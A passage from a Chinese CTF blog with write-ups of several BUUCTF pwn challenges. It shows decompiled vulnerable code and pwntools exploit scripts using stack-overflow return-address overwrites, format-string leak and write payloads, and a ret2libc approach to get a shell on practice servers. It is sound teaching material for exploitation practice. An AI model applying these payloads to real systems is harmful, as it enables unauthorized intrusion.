process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span>+<span class="number">0x8</span>) + p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;e9332920-7605-4cbc-a337-3d75d42eb052&#125;</code><br>exp中后面函数地址加1的原因是为了保持16字节对齐，在64位指令中存在movaps指令，需要传入的参数16字节对齐，否则会抛出异常。这是一个比较坑的地方。<br><a href="https://iamvegetable2.github.io/2022/07/27/some-problems-about-movaps/">详细原因请见</a></p><h2 id="warmup-csaw-2016">warmup_csaw_2016</h2><p>很简单的栈溢出。<br>checksec一下，再使用IDA分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40060D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_40060D为后门函数，可以直接拿到flag。<br>main函数中gets(v5)语句存在栈溢出，通过动态调试，我们可以计算得输入数据的地址与rbp的差值为0x40字节，故需要0x48字节的填充数据，再填充上我们sub_40060D的地址即可。<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27568</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)  + p64(<span class="number">0x40060D</span>) </span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*(0x40+0x8) + p64(0x4006a4) + p64(0x40060D) </span></span><br><span class="line"><span class="comment"># 看有一些wp这样写，这个中间填充的数据为ret gadget，主要作用可能是维护堆栈平衡？但事实上上面的payload就可以拿到flag了</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>可以直接得到flag<code>flag&#123;722bdaf7-e159-44da-a466-dc4121ed6adc&#125;</code></p><h2 id="ciscn-2019-n-1">ciscn_2019_n_1</h2><p>checksec，64位，仅开启PIE。<br>main函数作用仅仅是设置缓冲区和调用func函数，直接看func函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当v2为11.28125时，调用system读取flag，我们只需要让v2的值为11.28125即可。<br>不过函数中并没有设置v2值的位置。gets函数读入的输入存入v1中，我们可以考虑使v1溢出，覆盖v2的位置，从而修改v2的值。<br>根据动态调试，v1的起始地址与rbp的差值为0x30字节，v2为0x4字节，则v1与v2中间的差值为(0x30-0x4)字节，v2处的值填充为11.28125的机器码即可。<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27229</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;eabfcf4c-f318-4354-ba3e-57202826b8ee&#125;</code></p><h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2><p>checksec，32位，仅开启NX。<br>是C++写成的程序，main函数没什么作用，直接看vuln函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑是将输入字符串中’I’替换位’you’，输入限定为32字节，根据动态分析需要60字节才能溢出。<br>所以我们输入21个’I’，再添加1个’a’，从而使得替换后字符串垃圾数据为64字节，再填入get_flag函数地址即可。（这道题出的比较巧妙，如果地址中有值被解码为I可能会被破坏。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29154</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">21</span> + <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x8048f0d</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>得flag<code>flag&#123;62b7c079-6ced-4a49-a877-d3bb54a3409e&#125;</code></p><h2 id="jarvisoj-level0">jarvisoj_level0</h2><p>checksec，64位，仅开启NX。<br>main函数调用vulnerable_function函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read函数可以读取0x200字节，而buf仅能存储128字节，会造成栈溢出，同时存在callsystem函数，可以直接拿shell。<br>动态调试得需要0x88的垃圾数据，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28453</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;66fab62a-9200-43e6-93d9-d74b41b3fe47&#125;</code></p><h2 id="第五空间2019-决赛-PWN5-1">[第五空间2019 决赛]PWN5 1</h2><p>checksec，32位，开启NX，Canary。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u); <span class="comment">// 开启Canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出可能没有什么太好的方法，毕竟有Canary，且静态分析时粗略估计，read函数的限定条件可能不足以使我们的字符串达到溢出的效果。看到<code>printf(buf)</code>可以考虑格式化字符串漏洞，直接读取0x804C044处字符串，从而获取随机生成的密码。<br>这样我们可以输入0x804C044的地址，再通过<code>%n$s</code>读取其中的内容。其中当我们调用<code>printf(buf)</code>时，我们输入的buf字符串的地址与esp的差值为0x28，可以被是为printf()的第11个参数（因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，再加上第一个参数为格式化字符串，则为printf函数的第(n + 1)个参数）。<code>%s</code>可以解析地址，并将地址值处存储的数据作为字符串来进行解析处理，这是我最初的思路。最终只需要让我们输入的密码与随机生成的密码相同即可拿到shell，这里因为有atoi函数，需要输入的是数字。</p><p><a href="https://iamvegetable2.github.io/2022/07/27/Format-String/">格式化字符串相关见</a></p><p>第一种方式就是上面的思路，泄露0x804C044处字符串，接收泄露的字符串后再将其发送。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25897</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804C044</span>) + <span class="string">b&#x27;%10$s&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello,&#x27;</span>)</span><br><span class="line">passwd =  r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">passwd = passwd[<span class="number">4</span>:]</span><br><span class="line">passwd = u32(passwd)</span><br><span class="line">passwd = <span class="built_in">str</span>(passwd)</span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">payload2 = flat([passwd])</span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>还有另一种方法是通过格式化字符串漏洞写入0x804C044，从而使得它的值为我们设定好的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%n表示不输出字符，但是把已经成功输出的可打印字符个数写入对应的整型指针参数所指的变量</span><br><span class="line">%k$n表示写入该格式化字符串对应的第n个参数，即printf函数的第(n + 1)个参数</span><br></pre></td></tr></table></figure><p>我们可以填充一段垃圾数据，这里我们设定垃圾数据长度为4字节，esp与我们字符串的地址差距与我们上面计算的相同，由于我们所要填充的地址值放在更低地址处，距离esp距离更远，所以k的值为2位十进制数。所以计算可得我们构造payload为AAAA + %16<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n%17</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>n%18<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n%19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>n + p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3)（因为AAAA可以被视为第十个参数，前面垃圾数据加格式化字符串总共占据了24个字节，则第一个地址值可以视为第16个参数，之后以此类推。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25897</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">addr = <span class="number">0x804C044</span></span><br><span class="line">addr_w = p32(addr) + p32(addr+<span class="number">1</span>) + p32(addr+<span class="number">2</span>) + p32(addr+<span class="number">3</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;AAAA%16$n%17$n%18$n%19$n&#x27;</span> +addr_w</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;name:&#x27;</span>))</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>))</span><br><span class="line">payload2 = flat([<span class="built_in">str</span>(<span class="number">0x04040404</span>)])</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;fa16dae8-2cbf-43c2-8c5c-09ebc5b44087&#125;</code></p><h2 id="ciscn-2019-c-1">ciscn_2019_c_1</h2><p>一道非常离谱的题目，思路比较简单，栈溢出构造函数调用链，泄露got表项，即函数装载的地址，再根据这个值算出libc基址，从而调用system函数拿shell，只是一直跑不通 :sob:<br>倒也不是原理没搞清，主要是一直报莫名其妙的EOF，让人不能理解。<br>(后来发现多加了一个recvuntil()，我是** :sob:)<br>checksec，64位，仅开启NX。<br>IDA分析，为动态链接函数，plt表中无system。main函数没有太大的作用，只是要求我们的输入是1时才能调用encrypt函数。begin函数仅仅打印几串字符串，也没有什么作用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; s[x] &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼看到gets函数，存在栈溢出。根据动态调试，需要填充88字节的垃圾数据，由于加密会对我们输入的字符串进行处理，所以我们需要使用\x00进行截断（貌似不截断也可以，不过截断以后更稳妥），即b’\x00’加87个字节的其他数据，从而绕过<code>v0&gt;=strlen(s)</code>的检验。<br>首先这个程序中无system函数和’/bin/sh’，同时程序中的gadget不足以支持我们构造系统调用，再加上ASLR肯定是开启的，libc基址是变化的，所以我们需要想办法泄露某个函数的真实地址，从而根据该函数的地址值算出system函数以及’/bin/sh’的地址值。<br>构造思路很简单。当encrypt函数执行完毕后，程序已经调用了gets, puts, getchar等函数，根据动态链接的装载规律，此时这些函数的got.plt表中已经填入了其真实地址。所以我们需要将程序got表中内容打印出来，所以我们选择输出函数puts。该程序为64位，所以我们需要寻找<code>pop rdi| ret</code>这个gadget，从而实现传参。<br>为了实现获取shell，我们需要运行两次main或encrypt函数，第一次是泄露地址，第二次是拿shell。所以为了实现多次执行，我们需要传入main函数或encrypt函数的地址。所以第一个payload我们可以构造为：b’\x00’+b’a’*87覆盖子函数栈空间和存放父函数ebp的位置，<code>pop rdi|ret</code>的地址作为返回地址，某个库函数（这里我们选用的是gets函数）在got表中的地址，以及puts函数在plt表中的地址，最后还需要加上main函数或encrypt函数的地址。<br>我们接收地址值后，还需要知道libc的版本（因为不同libc可能偏移量有区别），才能计算出system函数的真实地址。LibcSearch算出的libc版本没一个是对的（全是古早版本的libc，可能是姿势不对，我看网上有大佬利用分页机制导致libc后3位恒不变的原理来找，我只能%%%），最终一个一个试出来了，<a href="http://xn--libc-2-h02m.27.so">是libc-2.27.so</a>。<br>最终构造第二个payload拿shell，填充数据与上一个payload一致，分别传入retn的地址（维护堆栈平衡，高版本ubuntu需要关注这一点），<code>pop rdi|ret</code>地址，'/bin/sh’的地址，system函数的真实地址，这道题就解决了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span 